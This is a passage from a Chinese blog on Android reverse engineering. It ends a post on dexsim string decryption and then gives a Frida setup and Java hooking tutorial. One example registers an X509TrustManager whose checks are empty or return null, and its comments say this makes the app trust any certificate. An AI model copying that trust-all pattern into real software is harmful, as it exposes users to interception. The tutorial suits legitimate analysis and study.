<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">		&quot;className&quot;: &quot;othn.iclauncher&quot;,</span><br><span class="line">		&quot;methodName&quot;: &quot;Ez&quot;,</span><br><span class="line">		&quot;arguments&quot;: [&quot;java.lang.String:FK9FD0004670751372201EA6&quot;],</span><br><span class="line">		&quot;id&quot;: &quot;a439b0d815c9a0a972c6b0dc69ec7bee5663ae9b65294b2828fbb8aaa098ce70&quot;</span><br><span class="line">	&#125;, &#123;</span><br><span class="line">		&quot;className&quot;: &quot;othn.iclauncher&quot;,</span><br><span class="line">		&quot;methodName&quot;: &quot;EA&quot;,</span><br><span class="line">		&quot;arguments&quot;: [&quot;java.lang.String:FKBEFCC3DA309EDA1B6FC62DF7E3EBECB5&quot;],</span><br><span class="line">		&quot;id&quot;: &quot;cdfcbfd5a872408ba4cc06b6f5a1fb48f1c5e18d5c36deb6e6fe41bd6b3d5c8c&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>target_contexts 存放解密前后的代码和方法体，方便后续替换。</p>
<p>几个关键的成员变量高清楚之后，剩下的东西也比较好理解，所以就不多说了，最后就是看看替换方法体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for key, value in outputs.items():</span><br><span class="line">    if key not in self.target_contexts:</span><br><span class="line">        print(key, value, &quot;not in&quot;)</span><br><span class="line">        continue</span><br><span class="line">    for mtd, old_content, new_content in self.target_contexts[key]:</span><br><span class="line">        old_body = mtd.get_body()</span><br><span class="line">        new_content = old_content + &quot;\n&quot; + new_content.format(value[0])</span><br><span class="line">        body = old_body.replace(old_content, new_content)</span><br><span class="line">        mtd.set_body(body)</span><br><span class="line">        self.make_changes = True</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">self.smali_files_update()</span><br></pre></td></tr></table></figure>
<p>outputs 为动态执行后的结果，主要格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;7b842f01264dc1d1a5089da9e86f531e90f5affe9ef36ecade2e2878a306ae7a&quot;: [&quot;sender&quot;],</span><br><span class="line">	&quot;5f0edfa5e4249ff38f5918e9b27197aec7aaeeed6c7c604a109bdfb21d9b7dc5&quot;: [&quot;ss&quot;],</span><br><span class="line">	&quot;642ed422a84d5ccab9e8fb27813c17d80b346af15295ffdc72dbd09d8662e34c&quot;: [&quot;raw_data&quot;],</span><br><span class="line">	&quot;e19e1215be04291d5a0c61232a7ae933a3ad6c6e760e7b86ccc2800f0350730a&quot;: [&quot;SUCCEED&quot;],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过相同的key进行替换，上面为了避免回编译为dex文件的时报错，直接使用的追加方式。</p>
<p>整个代码的原理大概就是这样，关键就是写插件，这一块就不详细说了，有兴趣可以看看 <code>Plugin</code> 目录中的插件.</p>
<p>最后看看解密后的效果吧。</p>
<p>解密前</p>
<img src="/2020/02/16/dexsim%E6%B5%85%E6%9E%90/2020-02-16-15-17-58.png" class="">

<p>解密后</p>
<img src="/2020/02/16/dexsim%E6%B5%85%E6%9E%90/2020-02-16-15-17-13.png" class="">


]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>dex字符串解密</tag>
      </tags>
  </entry>
  <entry>
    <title>frida环境配置</title>
    <url>/2020/01/19/frida%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>源码地址：<a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
</blockquote>
<blockquote>
<p>官网：<a href="https://frida.re/">https://frida.re/</a></p>
</blockquote>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="安装-Frida"><a href="#安装-Frida" class="headerlink" title="安装 Frida"></a>安装 Frida</h2><p>在安装 <code>Frida</code> 之前最好创建一个 <code>python</code> 虚拟环境，这样可以避免与其他环境产生干扰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mkvirtualenv -p python3 frida_12.8.7</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里使用 <code>pyenv</code> 创建虚拟环境更方便。目前我使用 <code>miniconda</code> 。</p>
</blockquote>
<p><strong>安装最新版</strong></p>
<p>进入虚拟环境，直接运行下来命令即可安装完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install frida-tools # CLI tools</span><br><span class="line">pip install frida       # Python bindings</span><br></pre></td></tr></table></figure>
<p>安装完成后，运行 <code>frida --version</code> 查看 frida 的版本</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2020-01-19-16-20-36.png" class="">

<p><strong>安装特定版 Frida</strong></p>
<p>通过 <a href="https://github.com/frida/frida/releases">Frida Releases</a> 页面找到需要安装的 <code>frida-tools</code> 版本，使用 <code>pip</code> 指定版本安装，这里以 <code>Frida 12.11.18</code> 为例。</p>
<p>首先找到 <code>frida-tools</code> 版本。</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2021-09-02-16-47-25.png" class="">

<p>然后使用 <code>pip</code> 安装对应的版本，下面为完整安装命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install frida==12.11.18</span><br><span class="line">pip install frida-tools==8.2.0</span><br></pre></td></tr></table></figure>

<p>安装完成后，根据 <code>Frida</code> 的版本去<a href="https://github.com/frida/frida/releases">下载</a>对应的 <code>frida-server</code>。</p>
<p>最后将 <code>frida-server push</code> 进 <code>data/local/tmp</code> 目录，并给予其运行权限，使用 <code>root</code> 用户启动。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ adb push frida-server data/local/tmp/</span><br><span class="line">$ adb shell</span><br><span class="line">sailfish:/ $ su</span><br><span class="line">sailfish:/ # chmod +x data/local/tmp/frida-server</span><br><span class="line">sailfish:/ # data/local/tmp//frida-server &amp;</span><br></pre></td></tr></table></figure>
<p>执行 <code>frida-ps -U</code> ,出现以下信息则表明安装成功。</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2020-01-19-16-31-30.png" class="">


<h2 id="配置开发环境"><a href="#配置开发环境" class="headerlink" title="配置开发环境"></a>配置开发环境</h2><p>为了在开发 Frida 脚本时有代码补全提示，我们可以使用下面两种方式进行环境配置。</p>
<h3 id="引用-frida-gum-d-ts"><a href="#引用-frida-gum-d-ts" class="headerlink" title="引用 frida-gum.d.ts"></a>引用 <code>frida-gum.d.ts</code></h3><p>在 <code>Frida</code> 源码中获取 <a href="https://github.com/frida/frida-gum/tree/6e36eebe1aad51c37329242cf07ac169fc4a62c4/bindings/gumjs/types/frida-gum">frida-gum.d.ts</a> 文件，该文件包含了所有的 API 。</p>
<p>在我们开发的 <code>js</code> 脚本首行中引用 <code>frida-gum.d.ts</code> 文件，即可实现代码补全提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`///&lt;reference path=&#x27;./frida-gum.d.ts&#x27;/&gt;`</span><br></pre></td></tr></table></figure>

<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2020-01-19-16-50-57.png" class="">

<p>其他方式获取 <code>frida-gum.d.ts</code> 文件：</p>
<blockquote>
<p><a href="https://www.npmjs.com/package/@types/frida-gum">https://www.npmjs.com/package/@types/frida-gum</a></p>
</blockquote>
<h3 id="使用-TypeScript"><a href="#使用-TypeScript" class="headerlink" title="使用 TypeScript"></a>使用 <code>TypeScript</code></h3><p>使用 <code>Frida</code> 作者提供的开发环境 <a href="https://github.com/oleavr/frida-agent-example">frida-agent-example</a> ，该环境需要使用 <code>TypeScript</code> 开发。</p>
<p>构建开发环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git://github.com/oleavr/frida-agent-example.git</span><br><span class="line">$ <span class="built_in">cd</span> frida-agent-example/</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<p>启用实时编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm run watch</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ frida-compile agent/index.ts -o _agent.js -w</span><br></pre></td></tr></table></figure>
<p>后续直接使用 <code>index.ts</code> 开发即可实现代码补全提示。</p>
<h2 id="配置调试环境"><a href="#配置调试环境" class="headerlink" title="配置调试环境"></a>配置调试环境</h2><p>这里主要使用 <code>chrome</code> 和 <code>pycharm</code> 两种方式进行调试。</p>
<p>首先使用 <code>Frida</code> 命令或者 <code>python</code> 脚本以调试模式加载 <code>js</code> 脚本。</p>
<p>Frida 命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U com.example.android -l _agent.js --debug --runtime=v8 &lt;port/name&gt;</span><br></pre></td></tr></table></figure>
<p>python 脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session = dev.attach(app.pid)</span><br><span class="line">script = session.create_script(jscode, runtime=<span class="string">&quot;v8&quot;</span>)</span><br><span class="line">session.enable_debugger()</span><br></pre></td></tr></table></figure>

<p>启动后会回显 <code>Inspector</code> 正在监听 <code>9229</code> 默认端口 。</p>
<h3 id="chome"><a href="#chome" class="headerlink" title="chome"></a>chome</h3><p>打开 <code>chrome://inspect</code> 页面, 点击 <code>Open dedicated DevTools for Node</code> 。</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2021-09-07-17-53-36.png" class="">

<p>此时 <code>debug</code> 已经连接，切换至 <code>Sources</code> ，按 <code>Command + P</code> 加载要调试的脚本，即可下断调试了。</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2021-09-07-17-56-47.png" class="">

<h3 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h3><p>首先安装 <code>Node.js</code> 插件，重启。然后添加调试器 <code>Attaching to Node.js/Chrome</code>，端口默认即可。</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2021-09-08-14-51-43.png" class="">

<blockquote>
<p>我这里使用的 <code>node</code> 版本为 12.21.0 。</p>
</blockquote>
<p>在 <code>ts</code> 文件中设置好断点，执行 pycharm 调试功能即可。</p>
<img src="/2020/01/19/frida%E4%BD%BF%E7%94%A8/2021-09-08-14-56-07.png" class="">

<blockquote>
<p>如果调试 <code>js</code> 脚本， 触发断点需要在 <code>debug</code> 窗口切换到 <code>script</code> 选项卡，右键要调试的脚本，选择 <code>Open Actual Source</code>，在新打开的 <code>Actual Source</code> 窗口设置好断点后，需要再取消&#x2F;启用一次所有断点作为激活，发现断点上打上对勾才真正可用了。（未测试）</p>
</blockquote>
<blockquote>
<p>参考：<a href="https://bbs.pediy.com/thread-265160-1.htm">https://bbs.pediy.com/thread-265160-1.htm</a></p>
</blockquote>
<h1 id="Frida-使用"><a href="#Frida-使用" class="headerlink" title="Frida 使用"></a>Frida 使用</h1><h2 id="Frida-启动"><a href="#Frida-启动" class="headerlink" title="Frida 启动"></a>Frida 启动</h2><h3 id="attach-启动"><a href="#attach-启动" class="headerlink" title="attach 启动"></a>attach 启动</h3><p><code>attach</code> 到已经存在的进程，核心原理是 <code>ptrace</code> 修改进程内存，如果进程处于调试状态（ <code>traceid</code> 不等于 <code>0</code> ），则 <code>attach</code> 失败。启动命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ frida -U com.example.android --no-pause -l _agent.js</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ frida -UF --no-pause -l _agent.js</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-U</code> : 连接 USB 设备。</li>
<li><code>-l</code> : 加载脚本。</li>
<li><code>--no-pause</code> : 启动后自动启动主线程。</li>
<li><code>-F</code> : 附加最前面的应用。</li>
</ul>
<p>以上命令对应的 <code>python</code> 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;message&quot;</span>,message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data&quot;</span>,data)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">&quot;com.example.android&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;_agent.js&quot;</span>,<span class="string">&quot;r&quot;</span>, encoding = <span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<h3 id="spawn-启动"><a href="#spawn-启动" class="headerlink" title="spawn 启动"></a>spawn 启动</h3><p>启动一个新的进程并挂起，在启动的同时注入 <code>frida</code> 代码，适用于在进程启动前的一些 <code>hook</code> ，如 <code>hook RegisterNative</code> 等，注入完成后调用 <code>resume</code> 恢复进程。启动命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -f com.example.android --no-pause  -l _agent.js</span><br></pre></td></tr></table></figure>
<p>对应的 <code>python</code> 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;message&quot;</span>,message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data&quot;</span>,data)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.example.android&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;_agent.js&quot;</span>,<span class="string">&#x27;r&#x27;</span>, encoding = <span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<h2 id="Frida-自定义端口"><a href="#Frida-自定义端口" class="headerlink" title="Frida 自定义端口"></a>Frida 自定义端口</h2><p>默认情况下启动 <code>frida-server</code> 将会开启 <code>27042</code> 端口，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sailfish:/ <span class="comment"># netstat -tunlp |grep frida</span></span><br><span class="line">tcp        0      0 127.0.0.1:27042         0.0.0.0:*               LISTEN      5038/frida-server-14.2.18-android-arm64</span><br><span class="line">tcp        0      0 127.0.0.1:27042         127.0.0.1:46075         ESTABLISHED 5038/frida-server-14.2.18-android-arm64</span><br><span class="line">tcp6       0      0 :::49039                :::*                    LISTEN      5038/frida-server-14.2.18-android-arm64</span><br></pre></td></tr></table></figure>
<p>如果该端口被占用，启动 <code>frida-server</code> 将会失败，我们可以使用 <code>-l</code> 参数自定义端口，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sailfish:/ <span class="comment"># /data/local/tmp/frida-server-14.2.18-android-arm64 -l 0.0.0.0:6666 &amp;</span></span><br></pre></td></tr></table></figure>

<p>对应的 <code>Frida</code> 启动方式也需要作相应的改变，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb forward tcp:6666 tcp:6666</span><br><span class="line">6666</span><br><span class="line">$ frida -H 127.0.0.1:6666 com.example.android -l _agent.js</span><br></pre></td></tr></table></figure>
<p>对应的 <code>python</code> 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jsCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">console.log(&quot;test&quot;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;message[<span class="string">&#x27;payload&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_device_manager().add_remote_device(<span class="string">&#x27;127.0.0.1:6666&#x27;</span>).attach(<span class="string">&#x27;com.example.android&#x27;</span>)</span><br><span class="line">script = process.create_script(jsCode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,message)</span><br><span class="line">script.load()</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果使用无线 <code>adb</code> 连接，则需要改变对应的 <code>IP</code> 为 <a href="https://github.com/RikkaApps/WADB">WADB</a> 显示的 <code>IP</code> 即可。</p>
</blockquote>
<h1 id="Frida-Hook-Java"><a href="#Frida-Hook-Java" class="headerlink" title="Frida Hook Java"></a>Frida Hook Java</h1><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="Java-perform"><a href="#Java-perform" class="headerlink" title="Java.perform"></a>Java.perform</h3><p>该方法相当于 C 语言的 <code>main()</code> 函数，Java 层的 Hook 都是从 <code>Java.perform</code> 开始的。具体用法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//在这里面写Hook的代码</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="Java-choose"><a href="#Java-choose" class="headerlink" title="Java.choose"></a>Java.choose</h3><p>用于查找堆中指定类的实例。获得实例后可以调用实例的函数。具体用法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//onMatch回调会在找到类的实例后调用，也就是说内存中有多少实例，就会调用多少次</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//onComplete回调会在所有onMatch完成后调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="comment">// Hook 对象</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span> (<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hook 对象 <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(instance)&#125;</span>`</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hook 对象 name: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(instance.name.value)&#125;</span>`</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook 对象 onComplete&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Java-available"><a href="#Java-available" class="headerlink" title="Java.available"></a>Java.available</h3><p>确认当前进程的 java 虚拟机是否已经启动，虚拟机包括 Dalbik 或者 ART 等。虚拟机没有启动的情况下不要唤醒其他 java 的属性或者方法。返回值是一个 <code>boolean</code> 。</p>
<h3 id="Java-enumerateLoadedClasses"><a href="#Java-enumerateLoadedClasses" class="headerlink" title="Java.enumerateLoadedClasses"></a>Java.enumerateLoadedClasses</h3><p>列出当前已经加载的类，用回调函数处理。声明为：<code>Java.enumerateLoadedClasses(callbacks)</code> 。用法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">    <span class="attr">onMacth</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123; <span class="comment">//className就是类的名称</span></span><br><span class="line">        <span class="comment">//找到加载的每个类的时候被调用，参数就是类的名字，这个参数可以传给java.use()来获得一个js类包</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//查找完毕所有类之后调用，主要用于扫尾工作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="Java-enumerateClassLoaders"><a href="#Java-enumerateClassLoaders" class="headerlink" title="Java.enumerateClassLoaders"></a>Java.enumerateClassLoaders</h3><p>主要用于列出 Java JVM 中存在的类加载器。声明为：<code>Java.enumerateClassLoaders(callbacks)</code> 。用法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123; <span class="comment">//loader就是类加载器</span></span><br><span class="line">        <span class="comment">//每找到一个就回调一次onMatch方法</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//在所有类加载器找出之后回调</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="Java-registerClass"><a href="#Java-registerClass" class="headerlink" title="Java.registerClass"></a>Java.registerClass</h3><p>用于注册一个类到内存，这个类可以是我们自己定义的，也就是说我们可以通过这个方式来自定义类加入到内存中，也可以是已经存在的类。声明为：<code>Java.registerClass(callbacks)</code> 。用法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;com.example.android.Dog&quot;</span>, <span class="comment">//类的全限定名.必传</span></span><br><span class="line">    <span class="attr">superClass</span>:<span class="string">&#x27;xxx&#x27;</span>, <span class="comment">//父类的全限定类名，可选</span></span><br><span class="line">    <span class="attr">implements</span>:<span class="string">&quot;xxx&quot;</span>, <span class="comment">//该类实现的接口全限定名，可选</span></span><br><span class="line">    <span class="attr">fields</span>:&#123;属性名:<span class="string">&quot;类型&quot;</span>&#125;, <span class="comment">//该类的属性集，可选</span></span><br><span class="line">    <span class="attr">methods</span>:&#123;&#125; <span class="comment">//该类的方法集，可选</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取目标进程的SomeBaseClass类</span></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">SomeBaseClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.SomeBaseClass&#x27;</span>);</span><br><span class="line"><span class="comment">//获取目标进程的X509TrustManager类</span></span><br><span class="line"><span class="keyword">let</span> X509TrustManager = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.X509TrustManager&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">MyWeirdTrustManager</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">  <span class="comment">//注册一个类是进程中的MyWeirdTrustManager类</span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;com.example.MyWeirdTrustManager&#x27;</span>,</span><br><span class="line">  <span class="comment">//父类是SomeBaseClass类</span></span><br><span class="line">  <span class="attr">superClass</span>: <span class="title class_">SomeBaseClass</span>,</span><br><span class="line">  <span class="comment">//实现了MyWeirdTrustManager接口类</span></span><br><span class="line">  <span class="attr">implements</span>: [X509TrustManager],</span><br><span class="line">  <span class="comment">//类中的属性</span></span><br><span class="line">  <span class="attr">fields</span>: &#123;</span><br><span class="line">    <span class="attr">description</span>: <span class="string">&#x27;java.lang.String&#x27;</span>,</span><br><span class="line">    <span class="attr">limit</span>: <span class="string">&#x27;int&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//定义的方法</span></span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="comment">//类的构造函数</span></span><br><span class="line">    <span class="attr">$init</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Constructor called&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//X509TrustManager接口中方法之一，该方法作用是检查客户端的证书</span></span><br><span class="line">    <span class="attr">checkClientTrusted</span>: <span class="keyword">function</span> (<span class="params">chain, authType</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkClientTrusted&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//该方法检查服务器的证书，不信任时。在这里通过自己实现该方法，可以使之信任我们指定的任何证书。在实现该方法时，也可以简单的不做任何处理，即一个空的函数体，由于不会抛出异常，它就会信任任何证书。</span></span><br><span class="line">    <span class="attr">checkServerTrusted</span>: [&#123;</span><br><span class="line">      <span class="comment">//返回值类型</span></span><br><span class="line">      <span class="attr">returnType</span>: <span class="string">&#x27;void&#x27;</span>,</span><br><span class="line">      <span class="comment">//参数列表</span></span><br><span class="line">      <span class="attr">argumentTypes</span>: [<span class="string">&#x27;[Ljava.security.cert.X509Certificate;&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>],</span><br><span class="line">      <span class="comment">//实现方法</span></span><br><span class="line">      <span class="attr">implementation</span>: <span class="keyword">function</span> (<span class="params">chain, authType</span>) &#123;</span><br><span class="line">         <span class="comment">//输出</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkServerTrusted A&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="attr">returnType</span>: <span class="string">&#x27;java.util.List&#x27;</span>,</span><br><span class="line">      <span class="attr">argumentTypes</span>: [<span class="string">&#x27;[Ljava.security.cert.X509Certificate;&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>],</span><br><span class="line">      <span class="attr">implementation</span>: <span class="keyword">function</span> (<span class="params">chain, authType, host</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkServerTrusted B&#x27;</span>);</span><br><span class="line">        <span class="comment">//返回null会信任所有证书</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="comment">//　返回受信任的X509证书数组。</span></span><br><span class="line">    <span class="attr">getAcceptedIssuers</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getAcceptedIssuers&#x27;</span>);</span><br><span class="line">      <span class="keyword">return</span> [];</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Java-use"><a href="#Java-use" class="headerlink" title="Java.use"></a>Java.use</h3><p>在 Frida 中通过 <code>Java.use(className)</code> 来加载类，相当于 Java 的 <code>Class.forName()</code> 。用法如下:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载String类</span></span><br><span class="line"><span class="keyword">let</span> jString = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure>
